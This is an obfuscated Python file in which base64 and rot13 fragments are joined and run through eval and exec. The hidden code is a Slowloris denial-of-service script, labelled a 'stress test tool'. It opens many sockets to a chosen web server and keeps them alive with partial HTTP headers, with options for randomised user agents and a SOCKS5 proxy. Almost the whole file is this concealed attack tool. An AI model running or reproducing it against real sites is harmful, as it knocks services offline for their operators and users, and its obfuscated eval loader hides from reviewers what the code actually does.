# Python code obfuscated by www.development-tools.net


import base64, codecs
magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgYXJncGFyc2UKaW1wb3J0IGxvZ2dpbmcKaW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKCmxvZ2dpbmcuYmFzaWNDb25maWcoZm9ybWF0PSJbJShhc2N0aW1lKXNdICUobWVzc2FnZSlzIiwKICAgICAgICAgICAgICAgICAgICBkYXRlZm10PSIlZC0lbS0lWSAlSDolTTolUyIsCiAgICAgICAgICAgICAgICAgICAgZW5jb2Rpbmc9J3V0Zi04JywKICAgICAgICAgICAgICAgICAgICBsZXZlbD1sb2dnaW5nLkRFQlVHKQoKcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoCiAgICBkZXNjcmlwdGlvbj0iU2xvd2xvcmlzLCBsb3cgYmFuZHdpZHRoIHN0cmVzcyB0ZXN0IHRvb2wgZm9yIHdlYnNpdGVzIgopCnBhcnNlci5hZGRfYXJndW1lbnQoImhvc3QiLCBuYXJncz0iPyIsIGhlbHA9Ikhvc3QgdG8gcGVyZm9ybSBzdHJlc3MgdGVzdCBvbiIpCnBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAiLXAiLCAiLS1wb3J0IiwgZGVmYXVsdD04MCwgaGVscD0iUG9ydCBvZiB3ZWJzZXJ2ZXIsIHVzdWFsbHkgODAiLCB0eXBlPWludAopCnBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAiLXMiLAogICAgIi0tc29ja2V0cyIsCiAgICBkZWZhdWx0PTE1MCwKICAgIGhlbHA9Ik51bWJlciBvZiBzb2NrZXRzIHRvIHVzZSBpbiB0aGUgdGVzdCIsCiAgICB0eXBlPWludCwKKQpwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgIi12IiwKICAgICItLXZlcmJvc2UiLAogICAgZGVzdD0idmVyYm9zZSIsCiAgICBhY3Rpb249InN0b3JlX3RydWUiLAogICAgaGVscD0iSW5jcmVhc2VzIGxvZ2dpbmciLAopCnBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAiLXVhIiwKICAgICItLXJhbmR1c2VyYWdlbnRzIiwKICAgIGRlc3Q9InJhbmR1c2VyYWdlbnQiLAogICAgYWN0aW9uPSJzdG9yZV90cnVlIiwKICAgIGhlbHA9IlJhbmRvbWl6ZXMgdXNlci1hZ2VudHMgd2l0aCBlYWNoIHJlcXVlc3QiLAopCnBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAiLXgiLAogICAgIi0tdXNlcHJveHkiLAogICAgZGVzdD0idXNlcHJveHkiLAogICAgYWN0aW9uPSJzdG9yZV90cnVlIiwKICAgIGhlbHA9IlVzZSBhIFNPQ0tTNSBwcm94eSBmb3IgY29ubmVjdGluZyIsCikKcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICItLXByb3h5LWhvc3QiLCBkZWZhdWx0PSIxMjcuMC4wLjEiLCBoZWxwPSJTT0NLUzUgcHJveHkgaG9zdCIKKQpwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgIi0tcHJveHktcG9ydCIsIGRlZmF1bHQ9IjkxNTAiLCBoZWxwPSJTT0NLUzUgcHJveHkgcG9ydCIsIHR5cGU9aW50CikKcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICItLWh0dHBzIiwKICAgIGRlc3Q9Imh0dHBzIiwKICAgIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICBoZWxwPSJVc2UgSFRUUFMgZm9yIHRoZSByZXF1ZXN0cyIsCikKcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICItLXNsZWVwdGltZSIsCiAgICBkZXN0PSJzbGVlcHRpbWUiLAogICAgZGVmYXVsdD0xNSwKICAgIHR5cGU9aW50LAogICAgaGVscD0iVGltZSB0byBzbGVlcCBiZXR3ZWVuIGVhY2ggaGVhZGVyIHNlbnQuIiwKKQpwYXJzZXIuc2V0X2RlZmF1bHRzKHZlcmJvc2U9RmFsc2UpCnBhcnNlci5zZXRfZGVmYXVsdHMocmFuZHVzZXJhZ2VudD1GYWxzZSkKcGFyc2VyLnNldF9kZWZhdWx0cyh1c2Vwcm94eT1GYWxzZSkKcGFyc2VyLnNldF9kZWZhdWx0cyhodHRwcz1GYWxzZSkKYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKCmlmIGxlbihzeXMuYXJndikgPD0gMToKICAgIHBhcnNlci5wcmludF9oZWxwKCkKICAgIHN5cy5leGl0KDEpCgppZiBub3QgYXJncy5ob3N0OgogICAgcHJpbnQoIkhvc3QgcmVxdWlyZWQhIikKICAgIHBhcnNlci5wcmludF9oZWxwKCkKICAgIHN5cy5leGl0KDEpCgppZiBhcmdzLnVzZXByb3h5OgogICAgIyBUcmllcyB0byBpbXBvcnQgdG8gZXh0ZXJuYWw'
love = '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'
god = 'BHZWNrbykgVmVyc2lvbi8xMC4wLjEgU2FmYXJpLzYwMi4yLjE0IiwKICAgICJNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMikgQXBwbGVXZWJLaXQvNjAyLjEuNTAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzEwLjAgU2FmYXJpLzYwMi4xLjUwIiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTEuMC4yNzA0Ljc5IFNhZmFyaS81MzcuMzYgRWRnZS8xNC4xNDM5MyIKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTMuMC4yNzg1LjE0MyBTYWZhcmkvNTM3LjM2IiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTQuMC4yODQwLjcxIFNhZmFyaS81MzcuMzYiLAogICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTMuMC4yNzg1LjE0MyBTYWZhcmkvNTM3LjM2IiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU0LjAuMjg0MC43MSBTYWZhcmkvNTM3LjM2IiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NDsgcnY6NDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80OS4wIiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81My4wLjI3ODUuMTQzIFNhZmFyaS81MzcuMzYiLAogICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU0LjAuMjg0MC43MSBTYWZhcmkvNTM3LjM2IiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTMuMC4yNzg1LjE0MyBTYWZhcmkvNTM3LjM2IiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTQuMC4yODQwLjcxIFNhZmFyaS81MzcuMzYiLAogICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjQ5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDkuMCIsCiAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28iLAogICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMzsgcnY6MzYuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zNi4wIiwKICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjM7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTMuMC4yNzg1LjE0MyBTYWZhcmkvNTM3LjM2IiwKICAgICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81My4wLjI3ODUuMTQzIFNhZmFyaS81MzcuMzYiLAogICAgIk1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo0OS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQ5LjAiLApdCgpzZXRhdHRyKHNvY2tldC5zb2NrZXQsICJzZW5kX2xpbmUiLCBzZW5kX2xpbmUpCnNldGF0dHIoc29ja2V0LnNvY2tldCwgInNlbmRfaGVhZGVyI'
destiny = 'vjtp2IhMS9bMJSxMKVcPtbXMTIzVTyhnKEsp29wn2I0XTyjXGbXVPNtVUZtCFOmo2AeMKDhp29wn2I0XUAiL2gyqP5OEy9WGxIHYPOmo2AeMKDhH09QF19GISWSDH0cPvNtVPOmYaAyqUEcoJIiqKDbAPxXPvNtVPOmYzAioz5yL3DbXTyjYPOupzqmYaOipaDcXDbXVPNtVTyzVTSlM3ZhnUE0pUZ6PvNtVPNtVPNtL3E4VQ0tp3AfYzAlMJS0MI9xMJMuqJk0K2AioaEyrUDbXDbtVPNtVPNtVUZtCFOwqUthq3WupS9mo2AeMKDbpljtp2IlqzIlK2uip3EhLJ1yCJSlM3ZhnT9mqPxXPvNtVPOmYaAyozEsoTyhMFuzVxqSIPNiC3glLJ5xo20hpzShMTyhqPtjYPNlZQNjXK0tFSEHHP8kYwRvXDbXVPNtVUIuVQ0tqKAypy9uM2IhqUAoZS0XVPNtVTyzVTSlM3ZhpzShMUImMKWuM2IhqQbXVPNtVPNtVPO1LFN9VUWuozEioF5wnT9cL2HbqKAypy9uM2IhqUZcPtbtVPNtpl5mMJ5xK2uyLJEypvtvIKAypv1OM2IhqPVfVUIuXDbtVPNtpl5mMJ5xK2uyLJEypvtvDJAwMKO0YJkuozq1LJqyVvjtVzIhYIIGYTIhYUR9ZP41VvxXVPNtVUWyqUIlovOmPtbXMTIzVT1unJ4bXGbXVPNtVTyjVQ0tLKWapl5bo3A0PvNtVPOmo2AeMKEsL291oaDtCFOupzqmYaAiL2gyqUZXVPNtVTkiM2qcozphnJ5zoltvDKE0LJAenJ5aVPImVUqcqTttWKZtp29wn2I0pl4vYPOcpPjtp29wn2I0K2AiqJ50XDbXVPNtVTkiM2qcozphnJ5zoltvD3WyLKEcozptp29wn2I0pl4hYvVcPvNtVPOzo3VtKlOcovOlLJ5aMFumo2AeMKEsL291oaDcBtbtVPNtVPNtVUElrGbXVPNtVPNtVPNtVPNtoT9aM2yhMl5xMJW1MltvD3WyLKEcozptp29wn2I0VT5lVPImVvjtKlxXVPNtVPNtVPNtVPNtplN9VTyhnKEsp29wn2I0XTyjXDbtVPNtVPNtVTI4L2IjqPOmo2AeMKDhMKWlo3VtLKZtMGbXVPNtVPNtVPNtVPNtoT9aM2yhMl5xMJW1MluyXDbtVPNtVPNtVPNtVPOvpzIunjbtVPNtVPNtVTkcp3Eso2Msp29wn2I0pl5upUOyozDbplxXPvNtVPO3nTyfMFOHpaIyBtbtVPNtVPNtVUElrGbXVPNtVPNtVPNtVPNtoT9aM2yhMl5cozMiXNbtVPNtVPNtVPNtVPNtVPNtVyAyozEcozptn2IypP1uoTy2MFObMJSxMKWmYv4hVSAiL2gyqPOwo3IhqQbtWKZvYNbtVPNtVPNtVPNtVPNtVPNtoTIhXTkcp3Eso2Msp29wn2I0plxfPvNtVPNtVPNtVPNtVPxXVPNtVPNtVPNtVPNtMz9lVUZtnJ4toTymqPufnKA0K29zK3AiL2gyqUZcBtbtVPNtVPNtVPNtVPNtVPNtqUW5BtbtVPNtVPNtVPNtVPNtVPNtVPNtVUZhp2IhMS9bMJSxMKVbVytgLFVfVUWuozEioF5lLJ5xnJ50XQRfVQHjZQNcXDbtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VUAiL2gyqP5ypaWipwbXVPNtVPNtVPNtVPNtVPNtVPNtVPOfnKA0K29zK3AiL2gyqUZhpzIgo3MyXUZcPtbtVPNtVPNtVPNtVPOzo3VtKlOcovOlLJ5aMFumo2AeMKEsL291oaDtYFOfMJ4boTymqS9iMy9mo2AeMKEmXFx6PvNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzEyLaIaXPWFMJAlMJS0nJ5aVUAiL2gyqP4hYvVcPvNtVPNtVPNtVPNtVPNtVPO0pax6PvNtVPNtVPNtVPNtVPNtVPNtVPNtplN9VTyhnKEsp29wn2I0XTyjXDbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVUZ6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTkcp3Eso2Msp29wn2I0pl5upUOyozDbplxXVPNtVPNtVPNtVPNtVPNtVTI4L2IjqPOmo2AeMKDhMKWlo3VtLKZtMGbXVPNtVPNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzEyLaIaXTHcPvNtVPNtVPNtVPNtVPNtVPNtVPNtLaWyLJfXVPNtVPNtVPNtVPNtoT9aM2yhMl5xMJW1MltvH2kyMKOcozptMz9lVPIxVUAyL29hMUZvYPOupzqmYaAfMJIjqTygMFxXVPNtVPNtVPNtVPNtqTygMF5moTIypPuupzqmYaAfMJIjqTygMFxXPvNtVPNtVPNtMKuwMKO0VPuYMKyvo2SlMRyhqTIlpaIjqPjtH3ymqTIgEKucqPx6PvNtVPNtVPNtVPNtVTkiM2qcozphnJ5zoltvH3EipUOcozptH2kiq2kipzymVvxXVPNtVPNtVPNtVPNtLaWyLJfXPtccMvOsK25uoJIsKlN9CFNvK19gLJyhK18vBtbtVPNtoJScovtcPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
